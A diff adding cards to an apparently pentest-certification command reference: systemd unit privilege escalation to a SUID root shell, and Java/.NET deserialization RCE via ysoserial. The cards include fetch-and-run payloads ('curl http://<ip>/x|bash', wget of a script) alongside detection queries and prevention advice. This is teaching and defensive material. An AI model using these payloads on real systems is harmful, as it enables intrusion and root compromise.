+            "confidence": "medium",
+            "false_positives": "Legitimate WMI-driven management scripts",
+            "tuning": "Baseline normal WmiPrvSE children per host role"
+          }
+        ],
+        "visibility": {
+          "requires": [
+            "sysmon",
+            "windows-system"
+          ],
+          "better_with": [
+            "edr",
+            "defender-endpoint"
+          ]
+        }
+      }
     },
     {
       "platform": "linux",
@@ -190595,6 +196267,112 @@ const COMMAND_DATA = {
           "rel": "prereq"
         }
       ]
+    },
+    {
+      "id": "linux-systemd-privesc",
+      "name": "Writable systemd unit / relative ExecStart privesc",
+      "command": "systemctl start <unit>   # root runs attacker ExecStart from a writable unit",
+      "description": "systemd runs system services as root. If an unprivileged user can write a system-level .service or .timer unit file (world-writable unit, writable drop-in directory, or writable /etc/systemd/system), or if a unit's ExecStart points at a writable or relative binary path, the user sets ExecStart to their payload and starts/triggers the unit so systemd executes it as root. Also covers unit files reachable through a sudo systemctl grant.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Privilege Escalation",
+      "subcategory": "Linux - Service and Scheduler Abuse",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "HackTricks / HTB Linux Privilege Escalation",
+      "tags": [
+        "systemd",
+        "service",
+        "timer",
+        "execstart",
+        "writable-unit",
+        "privesc"
+      ],
+      "mitre": [
+        "T1543.002",
+        "T1548"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHAT IT IS ===\n  System services run as root. Control over the unit file (or the binary it runs)\n  means control over a root process. Three common openings:\n    1. Writable unit file in /etc/systemd/system or /lib/systemd/system\n    2. Writable binary referenced by ExecStart (or a relative/missing path)\n    3. sudo systemctl ... granting start/enable of a unit you can influence\n\n=== ENUMERATE ===\n  # writable unit files:\n  find /etc/systemd/system /lib/systemd/system /run/systemd/system -writable -name '*.service' -o -writable -name '*.timer' 2>/dev/null\n  # writable ExecStart targets:\n  systemctl list-units --type=service\n  grep -r '^ExecStart=' /etc/systemd/system 2>/dev/null\n  # can you sudo systemctl?\n  sudo -l\n\n=== WRITABLE UNIT -> ROOT ===\n  cat > /etc/systemd/system/pwn.service <<'EOF'\n  [Unit]\n  Description=pwn\n  [Service]\n  Type=oneshot\n  ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'\n  [Install]\n  WantedBy=multi-user.target\n  EOF\n  systemctl daemon-reload\n  systemctl start pwn.service\n  /tmp/rootbash -p          # uid=0\n\n=== WRITABLE ExecStart BINARY ===\n  # If ExecStart=/opt/app/run.sh and run.sh is writable, append your payload and\n  # wait for (or trigger) the service restart.\n\n=== WRITABLE .timer ===\n  # A writable .timer with OnCalendar/OnBootSec starting a unit you control runs it as root on schedule.\n\n=== ALTERNATIVES ===\n  cron-abuse-pspy (cron-based); sudo-abuse (sudo systemctl)",
+      "examples": [
+        {
+          "label": "Find writable system unit files",
+          "command": "find /etc/systemd/system /lib/systemd/system -writable \\( -name '*.service' -o -name '*.timer' \\) 2>/dev/null"
+        },
+        {
+          "label": "Drop a oneshot unit that makes a SUID bash",
+          "command": "printf '[Service]\\nType=oneshot\\nExecStart=/bin/bash -c \"cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\"\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/pwn.service"
+        },
+        {
+          "label": "Reload, start, and use the SUID shell",
+          "command": "systemctl daemon-reload; systemctl start pwn.service; /tmp/rootbash -p"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks - systemd privesc",
+          "url": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd"
+        },
+        {
+          "title": "GTFOBins - systemctl",
+          "url": "https://gtfobins.github.io/gtfobins/systemctl/"
+        },
+        {
+          "title": "systemd.service man page",
+          "url": "https://www.freedesktop.org/software/systemd/man/systemd.service.html"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cron-abuse-pspy",
+          "note": "Scheduler-based root execution via cron, same idea as a .timer.",
+          "rel": "alternative"
+        },
+        {
+          "id": "sudo-abuse",
+          "note": "A sudo systemctl grant is a common way in.",
+          "rel": "prereq"
+        },
+        {
+          "id": "find-suid-sgid",
+          "note": "Pair with SUID enumeration when no writable unit exists.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "systemd starts system units as root from the service manager. If filesystem permissions let an unprivileged user modify a unit file, a drop-in, or the executable an ExecStart points to - or a sudo rule lets them control systemctl - they can make systemd run an attacker-chosen command with root privileges. A relative or unquoted ExecStart path can also be hijacked via a writable earlier directory.",
+        "prerequisites": "Write access to a system unit file / drop-in / its referenced binary, OR a sudo grant for systemctl start|enable|restart of an influenceable unit. daemon-reload (or a reboot/timer) to pick up changes.",
+        "impact": "Arbitrary command execution as root and persistence (an enabled unit survives reboot), from a single filesystem or sudoers misconfiguration.",
+        "detection": "[MITRE T1543.002] Creation or modification of files under /etc/systemd/system, /run/systemd/system or /lib/systemd/system by a non-root user; systemctl daemon-reload followed by start/enable of a new unit; root processes spawned by systemd whose ExecStart resides in a writable or non-standard path.",
+        "artifacts": "auditd watch hits on the systemd unit directories; journald records of a new/changed unit and its start; a unit with ExecStart in /tmp, /home or /opt writable paths; a SUID shell or reverse-shell child of systemd.",
+        "splunk_spl": "index=linux sourcetype=\"linux:auditd\" (name=\"/etc/systemd/system/*\" OR name=\"/run/systemd/system/*\") (syscall=open OR syscall=openat OR syscall=rename) a1=\"*O_WRONLY*\"\n| where auid!=0\n| table _time, host, auid, exe, name",
+        "elastic_kql": "event.category:file and file.path:(\\/etc\\/systemd\\/system\\/* or \\/run\\/systemd\\/system\\/*) and not user.name:root",
+        "sentinel_kql": "Syslog\n| where SyslogMessage has \"systemd\" and SyslogMessage has_any (\"/etc/systemd/system\",\"daemon-reload\",\"ExecStart\")\n| project TimeGenerated, Computer, SyslogMessage\n| sort by TimeGenerated desc\n// non-root creating/modifying a system unit then starting it",
+        "sigma_rules": "lnx_systemd_unit_write_nonroot (non-root write to a system unit directory followed by start/enable)",
+        "prevention": "Ensure /etc/systemd/system, /lib/systemd/system and /run/systemd/system (and all unit files) are root-owned and not group/world-writable; use absolute, quoted ExecStart paths to root-owned binaries. Avoid sudo systemctl grants, or constrain them to specific read-only units. Audit unit directories with auditd and review on change.",
+        "sources": [
+          "https://book.hacktricks.xyz/linux-hardening/privilege-escalation",
+          "https://gtfobins.github.io/gtfobins/systemctl/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Non-root write to systemd unit directory then start",
+            "logic": "Syslog\n| where SyslogMessage has_any (\"/etc/systemd/system\",\"/run/systemd/system\")\n| where SyslogMessage has_any (\"daemon-reload\",\"systemctl start\",\"systemctl enable\",\"ExecStart\")\n| project TimeGenerated, Computer, SyslogMessage",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1543.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Package managers and configuration management (apt, dnf, Ansible, Puppet) legitimately install and reload units, but run as root.",
+            "tuning": "Restrict to writes by a non-root auid; alert when the new unit's ExecStart points into a writable path."
+          }
+        ]
+      }
     },
     {
       "id": "ad-writedacl-linux",
@@ -195444,6 +201222,222 @@ const COMMAND_DATA = {
       "explain": "Automates out-of-band XXE file exfiltration: give it a saved request template containing the XXEINJECT marker and it hosts the DTD, triggers the parse, and logs recovered files.:\n  <lhost>  your listener/attacker IP\n  <file>   file path\nRequest template: a raw HTTP POST with the XML body replaced by the literal XXEINJECT."
     },
     {
+      "id": "deser-java-ysoserial",
+      "name": "ysoserial - Java Deserialization RCE Gadget Chains",
+      "command": "java -jar ysoserial.jar <gadget_chain> \"<command>\" > payload.bin",
+      "description": "ysoserial generates Java serialized object payloads that abuse gadget chains present in common libraries (Apache Commons Collections, Spring, Groovy, Hibernate) to achieve remote code execution when an application calls ObjectInputStream.readObject() on attacker-controlled data. Java deserialization sinks show up in HTTP parameters, hidden form fields, cookies, RMI/JMX endpoints, and many enterprise message buses.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Web Exploitation",
+      "subcategory": "Deserialization",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "frohoff/ysoserial",
+      "tags": [
+        "deserialization",
+        "ysoserial",
+        "java",
+        "commons-collections",
+        "rce",
+        "urldns",
+        "rmi"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== IDENTIFY A JAVA SERIALIZED SINK ===\n  # Raw stream always starts with magic bytes AC ED 00 05.\n  # Base64 of that stream starts with rO0AB.\n  # Look for these in HTTP params, cookies, hidden fields, ViewState-like blobs, RMI/JMX/T3/JMS traffic.\n  echo -n '<blob>' | base64 -d | xxd | head   # confirm AC ED 00 05\n\n=== STEP 1: SAFE CONFIRMATION WITH URLDNS (no RCE, no gadget needed) ===\n  # URLDNS only triggers a DNS lookup - works on ANY classpath, proves the sink deserializes.\n  java -jar ysoserial.jar URLDNS \"http://<ip>.oast.pro/\" > urldns.bin\n  # Deliver urldns.bin, then watch your DNS/Burp Collaborator/interactsh listener for the callback.\n\n=== STEP 2: RCE ONCE A CHAIN IS CONFIRMED ===\n  java -jar ysoserial.jar CommonsCollections1 \"id\" > payload.bin\n  java -jar ysoserial.jar CommonsCollections6 \"wget http://<ip>/s.sh -O /tmp/s.sh\" > payload.bin\n  # Base64 for injection into a web parameter:\n  java -jar ysoserial.jar CommonsCollections6 \"curl http://<ip>/x|bash\" | base64 -w0\n\n=== COMMON GADGET CHAINS (pick by library on the classpath) ===\n  URLDNS                         # detection only, always works\n  CommonsCollections1..7         # commons-collections 3.1 / 4.0\n  Spring1, Spring2               # spring-core + spring-beans\n  Groovy1                        # groovy\n  Hibernate1, JSON1, Jdk7u21     # situational\n  # List everything your jar supports:\n  java -jar ysoserial.jar\n\n=== DELIVERY VECTORS ===\n- HTTP body / parameter / cookie carrying a base64 rO0AB blob\n- Java RMI registry (ysoserial.exploit.RMIRegistryExploit)\n- JMX / JNDI (pair with a JNDI/LDAP log4shell-style vector)\n- Message queues (JMS/ActiveMQ)\n\n=== ALTERNATIVES ===\n  marshalsec        # JNDI/RMI/LDAP marshalling gadgets\n  GadgetProbe       # remotely fingerprint which library classes exist\n  SerialVersionUID scanning in Burp (Java Deserialization Scanner / Freddy)",
+      "examples": [
+        {
+          "label": "Safe sink confirmation with URLDNS",
+          "command": "java -jar ysoserial.jar URLDNS \"http://<ip>/\" > urldns.bin"
+        },
+        {
+          "label": "Commons Collections RCE payload",
+          "command": "java -jar ysoserial.jar CommonsCollections6 \"id\" > payload.bin"
+        },
+        {
+          "label": "Base64 payload for a web parameter",
+          "command": "java -jar ysoserial.jar CommonsCollections6 \"id\" | base64 -w0"
+        }
+      ],
+      "references": [
+        {
+          "title": "frohoff/ysoserial",
+          "url": "https://github.com/frohoff/ysoserial"
+        },
+        {
+          "title": "PortSwigger - Insecure deserialization",
+          "url": "https://portswigger.net/web-security/deserialization"
+        },
+        {
+          "title": "OWASP Deserialization Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "exploit-deserialization",
+          "note": "Generic multi-language deserialization hub card.",
+          "rel": "prereq"
+        },
+        {
+          "id": "deser-dotnet-ysoserial",
+          "note": ".NET equivalent using ysoserial.net.",
+          "rel": "alternative"
+        },
+        {
+          "id": "deser-php-phpggc",
+          "note": "PHP object-injection chains with phpggc.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Calling ObjectInputStream.readObject() on untrusted bytes instantiates arbitrary classes and runs their readObject/finalize logic. Gadget chains stitch together library methods already on the classpath into an RCE primitive, so no attacker code needs to exist on the server beforehand.",
+        "prerequisites": "An endpoint that deserializes attacker-controlled Java objects, plus a vulnerable gadget library (e.g. commons-collections 3.1) on the application classpath.",
+        "impact": "Remote code execution as the application service account, leading to full server compromise.",
+        "detection": "[MITRE T1190] Inbound requests carrying the Java magic bytes (rO0AB base64 / AC ED 00 05 raw); [MITRE T1059] the JVM (java/javaw) spawning shell interpreters (sh, bash, cmd, powershell) or network tools (wget, curl) as child processes.",
+        "artifacts": "Web/proxy logs containing rO0AB or raw AC ED 00 05 blobs; EDR process-tree showing java -> sh/bash/cmd; outbound DNS to a URLDNS callback host; unexpected RMI/JMX connections.",
+        "splunk_spl": "index=web (request_body=\"*rO0AB*\" OR uri_query=\"*rO0AB*\")\n| table _time, src_ip, uri_path, request_body\n| join type=outer host [ search index=edr parent_process=\"*java*\" (process_name=sh OR process_name=bash OR process_name=cmd.exe) ]",
+        "elastic_kql": "http.request.body.content:*rO0AB* or url.query:*rO0AB*",
+        "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"java.exe\",\"javaw.exe\")\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"bash\",\"sh\")\n| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine",
+        "sigma_rules": "web_java_deserialization_ro0ab_payload",
+        "prevention": "Do not deserialize untrusted data; prefer JSON/XML with explicit schemas. Enforce a strict look-ahead class allowlist (ValidatingObjectInputStream / JEP 290 serialization filters). Remove or upgrade known gadget libraries; run the app with least privilege so RCE is contained.",
+        "sources": [
+          "frohoff/ysoserial",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Java process spawning a shell (deserialization RCE)",
+            "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"java.exe\",\"javaw.exe\")\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"bash\",\"sh\",\"wget\",\"curl\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+            "data_source": "edr",
+            "attack": [
+              "T1059"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Build servers or app tooling that legitimately shell out from Java",
+            "tuning": "Scope to production web/app tiers; allowlist known CI hosts"
+          }
+        ]
+      }
+    },
+    {
+      "id": "deser-dotnet-ysoserial",
+      "name": "ysoserial.net - .NET Deserialization RCE",
+      "command": "ysoserial.exe -g <gadget_chain> -f <formatter> -c \"<command>\" -o base64",
+      "description": "ysoserial.net builds malicious .NET serialized payloads that exploit gadget chains such as TypeConfuseDelegate and ActivitySurrogateSelector against insecure formatters (BinaryFormatter, LosFormatter, SoapFormatter, ObjectStateFormatter, and Json.NET with TypeNameHandling enabled). When an application deserializes attacker data with these formatters, the gadget chain yields remote code execution.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Web Exploitation",
+      "subcategory": "Deserialization",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "pwntester/ysoserial.net",
+      "tags": [
+        "deserialization",
+        "ysoserial.net",
+        "dotnet",
+        "binaryformatter",
+        "typeconfusedelegate",
+        "json.net",
+        "rce"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== IDENTIFY A .NET SERIALIZED SINK ===\n  # BinaryFormatter base64 payloads commonly start with AAEAAAD.\n  # Watch for __VIEWSTATE, SOAP bodies, Json.NET with \"$type\" keys, or binary blobs in params/cookies.\n\n=== BASIC RCE PAYLOADS ===\n  ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c \"calc\" -o base64\n  ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c \"cmd /c whoami > C:\\\\temp\\\\o.txt\" -o base64\n  ysoserial.exe -g ActivitySurrogateSelector -f BinaryFormatter -c \"cmd /c whoami\" -o raw\n  # ActivitySurrogateSelector may need the DisableActivitySurrogateSelectorTypeCheck gadget first on newer .NET:\n  ysoserial.exe -g ActivitySurrogateSelectorFromFile -f BinaryFormatter -c \"ExploitClass.cs;System.dll\" -o base64\n\n=== JSON.NET (TypeNameHandling != None) ===\n  ysoserial.exe -g ObjectDataProvider -f Json.Net -c \"calc\" -o raw\n  # Vulnerable config: JsonConvert.DeserializeObject(data, new JsonSerializerSettings{ TypeNameHandling = TypeNameHandling.All })\n\n=== FORMATTERS (-f) ===\n  BinaryFormatter, LosFormatter, SoapFormatter, ObjectStateFormatter,\n  NetDataContractSerializer, Json.Net, DataContractSerializer, XmlSerializer\n\n=== GADGETS (-g), list all ===\n  ysoserial.exe --fullhelp\n  # Popular: TypeConfuseDelegate, ActivitySurrogateSelector, ObjectDataProvider,\n  #          WindowsIdentity, PSObject, TextFormattingRunProperties (for ViewState)\n\n=== OUTPUT (-o) ===\n  base64 | raw | hex       # match how the sink expects the blob\n\n=== ALTERNATIVES ===\n  ViewState abuse (-p ViewState ...) when the sink is ASP.NET __VIEWSTATE - see deser-dotnet-viewstate\n  Freddy / Burp for sink discovery",
+      "examples": [
+        {
+          "label": "TypeConfuseDelegate + BinaryFormatter",
+          "command": "ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c \"calc\" -o base64"
+        },
+        {
+          "label": "Json.NET TypeNameHandling RCE",
+          "command": "ysoserial.exe -g ObjectDataProvider -f Json.Net -c \"calc\" -o raw"
+        },
+        {
+          "label": "ActivitySurrogateSelector raw payload",
+          "command": "ysoserial.exe -g ActivitySurrogateSelector -f BinaryFormatter -c \"cmd /c whoami\" -o raw"
+        }
+      ],
+      "references": [
+        {
+          "title": "pwntester/ysoserial.net",
+          "url": "https://github.com/pwntester/ysoserial.net"
+        },
+        {
+          "title": "PortSwigger - Insecure deserialization",
+          "url": "https://portswigger.net/web-security/deserialization"
+        },
+        {
+          "title": "OWASP Deserialization Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "exploit-deserialization",
+          "note": "Generic multi-language deserialization hub card.",
+          "rel": "prereq"
+        },
+        {
+          "id": "deser-dotnet-viewstate",
+          "note": "ASP.NET __VIEWSTATE abuse with the ViewState plugin.",
+          "rel": "next"
+        },
+        {
+          "id": "deser-java-ysoserial",
+          "note": "Java equivalent using ysoserial.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "BinaryFormatter / LosFormatter / SoapFormatter reconstruct arbitrary object graphs and invoke their callbacks, and Json.NET with TypeNameHandling honors a $type field that lets an attacker pick the type instantiated. Gadget chains already present in the .NET framework turn that into code execution.",
+        "prerequisites": "An endpoint deserializing attacker data with an insecure formatter (BinaryFormatter et al.) or Json.NET configured with TypeNameHandling other than None.",
+        "impact": "Remote code execution in the IIS/application worker process (often as an app-pool or service identity).",
+        "detection": "[MITRE T1190] Requests carrying AAEAAAD base64 blobs or SOAP/Json payloads with embedded $type; [MITRE T1059] w3wp.exe or the app host spawning cmd.exe/powershell.exe.",
+        "artifacts": "IIS logs with AAEAAAD or $type payloads; Sysmon/EDR process tree w3wp.exe -> cmd.exe/powershell.exe; new files written under inetpub/temp.",
+        "splunk_spl": "index=iis (cs_uri_query=\"*AAEAAAD*\" OR request_body=\"*$type*\")\n| table _time, c_ip, cs_uri_stem, cs_uri_query",
+        "elastic_kql": "http.request.body.content:(*AAEAAAD* or *\\$type*) or url.query:*AAEAAAD*",
+        "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"w3wp.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+        "sigma_rules": "web_dotnet_deserialization_aaeaaad_or_w3wp_child",
+        "prevention": "Stop using BinaryFormatter/SoapFormatter/LosFormatter (Microsoft has deprecated BinaryFormatter); set Json.NET TypeNameHandling to None; sign/encrypt ViewState with a protected machineKey; bind a SerializationBinder allowlist; run app pools with least privilege.",
+        "sources": [
+          "pwntester/ysoserial.net",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "IIS worker (w3wp.exe) spawning a shell",
+            "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"w3wp.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"certutil.exe\",\"bitsadmin.exe\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+            "data_source": "edr",
+            "attack": [
+              "T1059"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Rare legitimate admin tooling that shells out from IIS",
+            "tuning": "Alert on any w3wp child shell in production; correlate with AAEAAAD request signatures"
+          }
+        ]
+      }
+    },
+    {
       "id": "cdsa-m09-zeek-fundamentals",
       "name": "Zeek Fundamentals — Architecture, Logs & zeek-cut",
       "command": "/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/suspicious.pcap",
@@ -195890,8 +201884,8 @@ const COMMAND_DATA = {
       }
     }
   ],
-  "totalCommands": 1124,
-  "buildDate": "2026-11-11T12:39:32.980Z",
+  "totalCommands": 1179,
+  "buildDate": "2026-11-11T15:08:15.029Z",
   "certifications": [
     "CDSA",
     "CPTS",
